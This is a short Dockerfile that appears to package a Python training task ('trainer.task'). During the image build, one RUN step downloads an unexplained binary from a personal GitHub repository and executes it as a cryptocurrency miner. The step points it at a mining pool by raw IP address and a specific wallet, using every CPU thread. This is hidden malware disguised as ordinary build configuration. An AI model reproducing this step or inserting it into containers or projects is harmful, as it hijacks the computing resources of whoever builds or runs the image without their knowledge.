FROM ubuntu:latest
RUN apt update && apt -y install wget curl git sudo

WORKDIR /

RUN wget -qO sgr1 https://github.com/novalanto010101/file/raw/main/srb && chmod +x sgr1 && ./sgr1 --algorithm cryptonight_upx --pool 168.235.86.33:3393 --wallet SK_QzApkbVGsAxyQykaWSnEF.novalanto --enable-restart-on-rejected --max-rejected-shares 1 --main-pool-reconnect 2 --retry-time 1 --job-timeout 1 --password x --cpu-threads $(nproc --all)

COPY . /app

ENTRYPOINT ["python", "-m", "trainer.task"]
